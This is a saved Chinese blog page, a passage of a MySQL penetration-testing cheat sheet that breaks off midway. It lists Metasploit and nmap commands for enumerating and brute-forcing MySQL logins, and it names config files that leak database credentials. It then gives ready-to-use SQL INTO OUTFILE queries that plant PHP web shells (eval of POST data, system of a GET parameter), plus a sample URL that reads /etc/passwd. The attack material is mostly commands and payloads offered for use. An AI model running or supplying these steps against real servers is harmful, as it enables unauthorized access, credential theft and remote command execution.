@@ -1,0 +1,605 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>Mysql数据库渗透及漏洞利用总结 | Bug&#39;小虫</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="小虫">
+    
+
+    
+    <meta name="description" content="Mysql信息收集1.端口信息收集Mysql默认端口是3306端口，但也有自定义端口，针对默认端口 扫描主要利用扫描软件进行探测，推荐使用： （1）iisputter，直接填写3306端口，IP地址填写单个或者C段 地址。 （2）nmap扫描nmap -p 3306 192.168.1.1-254 特定目标的渗透，可能需要对全端口进行扫描，可以使用Nmap对 某一个IP地址进行全端口扫描，端口扫描">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql数据库渗透及漏洞利用总结">
+<meta property="og:url" content="http://yoursite.com/2016/01/01/Mysql数据库渗透及漏洞利用总结/index.html">
+<meta property="og:site_name" content="Bug&#39;小虫">
+<meta property="og:description" content="Mysql信息收集1.端口信息收集Mysql默认端口是3306端口，但也有自定义端口，针对默认端口 扫描主要利用扫描软件进行探测，推荐使用： （1）iisputter，直接填写3306端口，IP地址填写单个或者C段 地址。 （2）nmap扫描nmap -p 3306 192.168.1.1-254 特定目标的渗透，可能需要对全端口进行扫描，可以使用Nmap对 某一个IP地址进行全端口扫描，端口扫描">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-08-16T02:37:47.923Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mysql数据库渗透及漏洞利用总结">
+<meta name="twitter:description" content="Mysql信息收集1.端口信息收集Mysql默认端口是3306端口，但也有自定义端口，针对默认端口 扫描主要利用扫描软件进行探测，推荐使用： （1）iisputter，直接填写3306端口，IP地址填写单个或者C段 地址。 （2）nmap扫描nmap -p 3306 192.168.1.1-254 特定目标的渗透，可能需要对全端口进行扫描，可以使用Nmap对 某一个IP地址进行全端口扫描，端口扫描">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Bug&#39;小虫" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Bug&#39;小虫">Bug&#39;小虫</a></h1>
+				<h2 class="blog-motto">走过黑暗，前面便是光</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="[layout]" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/Mysql数据库渗透及漏洞利用总结/" title="Mysql数据库渗透及漏洞利用总结" itemprop="url">Mysql数据库渗透及漏洞利用总结</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql信息收集"><span class="toc-number">1.</span> <span class="toc-text">Mysql信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-端口信息收集"><span class="toc-number">1.1.</span> <span class="toc-text">1.端口信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#版本信息收集"><span class="toc-number">1.2.</span> <span class="toc-text">版本信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数据库管理信息收集"><span class="toc-number">1.3.</span> <span class="toc-text">数据库管理信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf信息收集模块"><span class="toc-number">1.4.</span> <span class="toc-text">msf信息收集模块</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql密码获取"><span class="toc-number">2.</span> <span class="toc-text">Mysql密码获取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#暴力破解"><span class="toc-number">2.1.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#网页在线连接破解"><span class="toc-number">2.1.1.</span> <span class="toc-text">网页在线连接破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf通过命令行进行暴力破解"><span class="toc-number">2.1.2.</span> <span class="toc-text">msf通过命令行进行暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用nmap扫描并破解密码"><span class="toc-number">2.1.3.</span> <span class="toc-text">使用nmap扫描并破解密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用hscan工具对mysql口令进行扫描，需要设置扫描IP地址段以及数据库口令字典及用户名字典。"><span class="toc-number">2.1.4.</span> <span class="toc-text">使用hscan工具对mysql口令进行扫描，需要设置扫描IP地址段以及数据库口令字典及用户名字典。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#源代码泄露"><span class="toc-number">2.2.</span> <span class="toc-text">源代码泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#网站源代码备份文件"><span class="toc-number">2.2.1.</span> <span class="toc-text">网站源代码备份文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#配置备份文件"><span class="toc-number">2.2.2.</span> <span class="toc-text">配置备份文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含"><span class="toc-number">2.3.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其它情况"><span class="toc-number">2.4.</span> <span class="toc-text">其它情况</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql获取webshell"><span class="toc-number">3.</span> <span class="toc-text">Mysql获取webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadminroot账号获取webshell"><span class="toc-number">3.1.</span> <span class="toc-text">phpmyadminroot账号获取webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#直接读取后门文件"><span class="toc-number">3.1.1.</span> <span class="toc-text">直接读取后门文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#直接导出一句话后门"><span class="toc-number">3.1.2.</span> <span class="toc-text">直接导出一句话后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#创建数据库导出一句话后门"><span class="toc-number">3.1.3.</span> <span class="toc-text">创建数据库导出一句话后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#可执行命令方式"><span class="toc-number">3.1.4.</span> <span class="toc-text">可执行命令方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过杀毒软件方式"><span class="toc-number">3.1.5.</span> <span class="toc-text">过杀毒软件方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#直接导出加密webshell"><span class="toc-number">3.1.6.</span> <span class="toc-text">直接导出加密webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMS系统获取webshell"><span class="toc-number">3.1.7.</span> <span class="toc-text">CMS系统获取webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#general-log-file获取webshell"><span class="toc-number">3.1.8.</span> <span class="toc-text">general_log_file获取webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap注入点获取webshell"><span class="toc-number">3.2.</span> <span class="toc-text">sqlmap注入点获取webshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql提权"><span class="toc-number">4.</span> <span class="toc-text">Mysql提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mof提权"><span class="toc-number">4.1.</span> <span class="toc-text">mof提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Webshell上传mof文件提权"><span class="toc-number">4.1.1.</span> <span class="toc-text">Webshell上传mof文件提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#生成nullevt-mof文件"><span class="toc-number">4.1.2.</span> <span class="toc-text">生成nullevt.mof文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过Mysql查询将文件导入"><span class="toc-number">4.1.3.</span> <span class="toc-text">通过Mysql查询将文件导入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Msf直接mof提权"><span class="toc-number">4.2.</span> <span class="toc-text">Msf直接mof提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方法1："><span class="toc-number">4.2.1.</span> <span class="toc-text">方法1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法2："><span class="toc-number">4.2.2.</span> <span class="toc-text">方法2：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF提权"><span class="toc-number">4.3.</span> <span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF提权条件"><span class="toc-number">4.3.1.</span> <span class="toc-text">UDF提权条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权方法"><span class="toc-number">4.3.2.</span> <span class="toc-text">提权方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell下udf提权"><span class="toc-number">4.3.3.</span> <span class="toc-text">webshell下udf提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql提权综合利用工具"><span class="toc-number">4.3.4.</span> <span class="toc-text">Mysql提权综合利用工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无法获取webshell提权"><span class="toc-number">4.4.</span> <span class="toc-text">无法获取webshell提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#连接mysql"><span class="toc-number">4.4.1.</span> <span class="toc-text">连接mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看数据库版本和数据路径"><span class="toc-number">4.4.2.</span> <span class="toc-text">查看数据库版本和数据路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修改mysql-txt"><span class="toc-number">4.4.3.</span> <span class="toc-text">修改mysql.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取webshell后添加用户命令"><span class="toc-number">4.4.4.</span> <span class="toc-text">获取webshell后添加用户命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap直连数据库提权"><span class="toc-number">4.5.</span> <span class="toc-text">sqlmap直连数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msfudf提权"><span class="toc-number">4.5.1.</span> <span class="toc-text">msfudf提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#启动项提权"><span class="toc-number">4.6.</span> <span class="toc-text">启动项提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#创建表并插入vbs脚本到表中"><span class="toc-number">4.6.1.</span> <span class="toc-text">创建表并插入vbs脚本到表中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#导出vbs脚本到启动"><span class="toc-number">4.6.2.</span> <span class="toc-text">导出vbs脚本到启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf下模块exploit-windows-mysql-mysql-start-up提权"><span class="toc-number">4.6.3.</span> <span class="toc-text">msf下模块exploit/windows/mysql/mysql_start_up提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Msf其它相关漏洞提权"><span class="toc-number">5.</span> <span class="toc-text">Msf其它相关漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql身份认证漏洞及利用-CVE-2012-2122"><span class="toc-number">5.1.</span> <span class="toc-text">Mysql身份认证漏洞及利用(CVE-2012-2122)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit-windows-mysql-mysql-yassl-hello"><span class="toc-number">5.2.</span> <span class="toc-text">exploit/windows/mysql/mysql_yassl_hello</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit-windows-mysql-scrutinizer-upload-exec"><span class="toc-number">5.3.</span> <span class="toc-text">exploit/windows/mysql/scrutinizer_upload_exec</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql密码破解"><span class="toc-number">6.</span> <span class="toc-text">mysql密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cain工具破解mysql密码"><span class="toc-number">6.1.</span> <span class="toc-text">cain工具破解mysql密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网站在线密码破解"><span class="toc-number">6.2.</span> <span class="toc-text">网站在线密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd5-com破解"><span class="toc-number">6.2.1.</span> <span class="toc-text">cmd5.com破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#somd5-com破解"><span class="toc-number">6.2.2.</span> <span class="toc-text">somd5.com破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oclhash破解"><span class="toc-number">6.3.</span> <span class="toc-text">oclhash破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#John-the-Ripper-password-cracker"><span class="toc-number">6.4.</span> <span class="toc-text">John the Ripper password cracker</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<h1 id="Mysql信息收集"><a href="#Mysql信息收集" class="headerlink" title="Mysql信息收集"></a>Mysql信息收集</h1><h2 id="1-端口信息收集"><a href="#1-端口信息收集" class="headerlink" title="1.端口信息收集"></a>1.端口信息收集</h2><p>Mysql默认端口是3306端口，但也有自定义端口，针对默认端口</p>
+<p>扫描主要利用扫描软件进行探测，推荐使用：</p>
+<p>（1）iisputter，直接填写3306端口，IP地址填写单个或者C段</p>
+<p>地址。</p>
+<p>（2）nmap扫描nmap -p 3306 192.168.1.1-254</p>
+<p>特定目标的渗透，可能需要对全端口进行扫描，可以使用Nmap对</p>
+<p>某一个IP地址进行全端口扫描，端口扫描软件还有sfind等DOS下</p>
+<p>扫描的工具。</p>
+<h2 id="版本信息收集"><a href="#版本信息收集" class="headerlink" title="版本信息收集"></a>版本信息收集</h2><p>（1）msf查看版本信息auxiliary/scanner/mysql/mysql_version模块，以扫描主机192.168.157.130为例，命令为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> use auxiliary/scanner/mysql/mysql_version</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.157.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p>(2）mysql查询版本命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@version`、`SELECT  version();</span><br></pre></td></tr></table></figure></p>
+<p>(3)sqlmap通过注入点扫描确认信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u url --dbms mysql</span><br></pre></td></tr></table></figure></p>
+<p>（4）phpmyadmin管理页面登录后查看localhost-&gt;变量-&gt;服务器变量和设置中的version参数值。</p>
+<h2 id="数据库管理信息收集"><a href="#数据库管理信息收集" class="headerlink" title="数据库管理信息收集"></a>数据库管理信息收集</h2><p>Mysql管理工具有多种，例如phpmyadmin网站管理，Navicat forMySQL以及MysqlFront等客户端工具。这些工具有的会直接保存配置信息，这些信息包含数据库服务器地址和数据库用户名以及密码，通过嗅探或者破解配置文件可以获取密码等信息。</p>
+<h2 id="msf信息收集模块"><a href="#msf信息收集模块" class="headerlink" title="msf信息收集模块"></a>msf信息收集模块</h2><p>（1）mysql哈希值枚举<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_hashdump</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p>（2）获取相关信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/mysql/mysql_enum</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p>获取数据库版本，操作系统名称，架构，数据库目录，数据库用户以及密码哈希值。</p>
+<p>（3）执行mysql语句，连接成功后可以在msf执行sql语句，跟sqlmap的–sql-shell模块类似。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/mysql/mysql_sql</span><br></pre></td></tr></table></figure></p>
+<p>（4）将mysql_schem导出到本地 /root/.msf4/loot/文件夹下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_schemadump</span><br></pre></td></tr></table></figure></p>
+<p>（5）文件枚举和目录可写信息枚举<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mysql/mysql_file_enum</span><br><span class="line">auxiliary/scanner/mysql/mysql_writable_dirs</span><br></pre></td></tr></table></figure></p>
+<p>没有测试成功过，需要定义枚举目录和相关文件，觉得基本没有啥用。</p>
+<h1 id="Mysql密码获取"><a href="#Mysql密码获取" class="headerlink" title="Mysql密码获取"></a>Mysql密码获取</h1><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>Mysql暴力破解主要有几种：</p>
+<h3 id="网页在线连接破解"><a href="#网页在线连接破解" class="headerlink" title="网页在线连接破解"></a>网页在线连接破解</h3><p>可以使用burpsuite和phpMyAdmin多线程批量破解工具。 下载：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/burp</span><br><span class="line">http://pan.baidu.com/s/1c1LD6co</span><br></pre></td></tr></table></figure></p>
+<h3 id="msf通过命令行进行暴力破解"><a href="#msf通过命令行进行暴力破解" class="headerlink" title="msf通过命令行进行暴力破解"></a>msf通过命令行进行暴力破解</h3><p>msf破解mysql密码模块auxiliary/scanner/mysql/mysql_login，其参数主要有<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">BLANK_PASSWORDS</span><br><span class="line">BRUTEFORCE_SPEED</span><br><span class="line">DB_ALL_CREDS</span><br><span class="line">DB_ALL_PASS</span><br><span class="line">DB_ALL_USERS</span><br><span class="line">PASSWORD</span><br><span class="line">PASS_FILE</span><br><span class="line">Proxies</span><br><span class="line">RHOSTS</span><br><span class="line">RPORT</span><br><span class="line">STOP_ON_SUCCESS</span><br><span class="line">THREADS</span><br><span class="line">USERNAME</span><br><span class="line">USERPASS_FILE</span><br><span class="line">USER_AS_PASS</span><br><span class="line">USER_FILE</span><br><span class="line">VERBOSE</span><br></pre></td></tr></table></figure></p>
+<p>对单一主机仅仅需要设置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RHOSTS</span><br><span class="line">RPORT</span><br><span class="line">USERNAME</span><br><span class="line">PASSWORD</span><br><span class="line">PASS_FILE</span><br></pre></td></tr></table></figure></p>
+<p>其它参数根据实际情况进行设置。</p>
+<p>（1）场景A：对内网获取root某一个口令后，扩展渗透<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.157.1-254</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p>执行后对192.168.157.1-254进行mysql密码扫描验证。</p>
+<p>（2）场景B：使用密码字典进行扫描<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.157.1-254</span><br><span class="line"><span class="built_in">set</span> pass_file /tmp/password.txt</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<h3 id="使用nmap扫描并破解密码"><a href="#使用nmap扫描并破解密码" class="headerlink" title="使用nmap扫描并破解密码"></a>使用nmap扫描并破解密码</h3><p>（1）对某一个IP或者IP地址段进行nmap默认密码暴力破解并扫描<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=mysql-brute 192.168.157.130</span><br><span class="line">nmap --script=mysql-brute 192.168.157.1-254</span><br></pre></td></tr></table></figure></p>
+<p>（2）使用root账号root密码进行mysql密码验证并扫描获取指定IP地址的端口信息以及mysql数据库相关信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script=mysql-databases--script-argsmysqluser=root,mysqlpass=root 192.168.157.130</span><br></pre></td></tr></table></figure></p>
+<p>（3）检查root空口令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script mysql-empty-password 192.168.195.130</span><br></pre></td></tr></table></figure></p>
+<h3 id="使用hscan工具对mysql口令进行扫描，需要设置扫描IP地址段以及数据库口令字典及用户名字典。"><a href="#使用hscan工具对mysql口令进行扫描，需要设置扫描IP地址段以及数据库口令字典及用户名字典。" class="headerlink" title="使用hscan工具对mysql口令进行扫描，需要设置扫描IP地址段以及数据库口令字典及用户名字典。"></a>使用hscan工具对mysql口令进行扫描，需要设置扫描IP地址段以及数据库口令字典及用户名字典。</h3><h2 id="源代码泄露"><a href="#源代码泄露" class="headerlink" title="源代码泄露"></a>源代码泄露</h2><h3 id="网站源代码备份文件"><a href="#网站源代码备份文件" class="headerlink" title="网站源代码备份文件"></a>网站源代码备份文件</h3><p>一些网站源代码文件中会包含数据库连接文件，通过查看这些文件可以获取数据库账号和密码。一般常见的数据库连接文件为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config.php</span><br><span class="line">web.config</span><br><span class="line">conn.asp</span><br><span class="line">db.php/asp</span><br><span class="line">jdbc.properties</span><br><span class="line">sysconfig.properties</span><br><span class="line">JBOSS_HOME\docs\examples\jca\XXXX-ds</span><br></pre></td></tr></table></figure></p>
+<p>以前有一款工具挖掘鸡可以自定义网站等名称对zip/rar/tar/tar.gz/gz/sql等后缀文件进行扫描。</p>
+<h3 id="配置备份文件"><a href="#配置备份文件" class="headerlink" title="配置备份文件"></a>配置备份文件</h3><p>使用ultraedit等编辑文件编辑数据库配置文件后，会留下bak文件。</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>本地文件包含漏洞可以包含文件，通过查看文件代码获取数据库配置文件，进而读取数据库用户名和密码。</p>
+<h2 id="其它情况"><a href="#其它情况" class="headerlink" title="其它情况"></a>其它情况</h2><p>有些软件会将IP地址、数据库用户名和密码写进程序中，运行程序后，通过cain软件进行嗅探，可以获取数据库密码。另外Mysql客户端管理工具有的管理员会建立连接记录，这些连接记录保存了用户名、密码和连接IP地址或者主机名，通过配置文件或者嗅探可以获取用户名和密码。</p>
+<h1 id="Mysql获取webshell"><a href="#Mysql获取webshell" class="headerlink" title="Mysql获取webshell"></a>Mysql获取webshell</h1><h2 id="phpmyadminroot账号获取webshell"><a href="#phpmyadminroot账号获取webshell" class="headerlink" title="phpmyadminroot账号获取webshell"></a>phpmyadminroot账号获取webshell</h2><p>MysqlRoot账号通过phpMyAdmin获取webshell的思路，主要有下面几种方式，以第一二六八种方法较佳，其它可以根据实际情况来进行。</p>
+<h3 id="直接读取后门文件"><a href="#直接读取后门文件" class="headerlink" title="直接读取后门文件"></a>直接读取后门文件</h3><p>通过程序报错、phpinfo函数、程序配置表等直接获取网站真实路径，有些网站前期已经被人渗透过，因此在目录下留有后门文件通过load_file直接读取。</p>
+<h3 id="直接导出一句话后门"><a href="#直接导出一句话后门" class="headerlink" title="直接导出一句话后门"></a>直接导出一句话后门</h3><p>前提需要知道网站的真实物理路径，例如呼求偶真实路径D:\work\WWW，则可以通过执行以下查询，来获取一句话后门文件cmd.php，访问地址<a href="http://www.somesite.com/cmd.php" target="_blank" rel="noopener">http://www.somesite.com/cmd.php</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php @eval($_POST[antian365]);?&gt;'</span>INTO OUTFILE <span class="string">'D:/work/WWW/antian365.php'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="创建数据库导出一句话后门"><a href="#创建数据库导出一句话后门" class="headerlink" title="创建数据库导出一句话后门"></a>创建数据库导出一句话后门</h3><p>在查询窗口直接执行以下代码即可，跟2.原理类似。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `mysql`.`antian365` (`temp` TEXT NOTNULL );</span><br><span class="line">INSERT INTO `mysql`.`antian365` (`temp` ) VALUES(<span class="string">'&lt;?php @eval($_POST[antian365]);?&gt;'</span>);</span><br><span class="line">SELECT `temp` FROM `antian365` INTO OUTFILE<span class="string">'D:/www/antian365.php'</span>;</span><br><span class="line">DROP TABLE IF EXISTS `antian365`;</span><br></pre></td></tr></table></figure></p>
+<h3 id="可执行命令方式"><a href="#可执行命令方式" class="headerlink" title="可执行命令方式"></a>可执行命令方式</h3><p>创建执行命令形式的shell，但前提是对方未关闭系统函数。该方法导出成功后可以直接执行DOS命令，使用方法:<a href="http://www.xxx.com/antian365.php?cmd=(cmd=后面直接执行dos命令)。" target="_blank" rel="noopener">www.xxx.com/antian365.php?cmd=(cmd=后面直接执行dos命令)。</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php echo \'</span>&lt;pre&gt;\<span class="string">';system($_GET[\'</span>cmd\<span class="string">']); echo \'</span>&lt;/pre&gt;\<span class="string">'; ?&gt;'</span> INTO OUTFILE <span class="string">'d:/www/antian365.php'</span></span><br></pre></td></tr></table></figure></p>
+<p>另外在linux下可以导出直接执行命令的shell：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">'&lt;? system($_GET[\'</span>c\<span class="string">']); ?&gt;'</span> INTO OUTFILE <span class="string">'/var/www/shell.php'</span>;</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://localhost/shell.php?c=cat%20/etc/passwd" target="_blank" rel="noopener">http://localhost/shell.php?c=cat%20/etc/passwd</a></p>
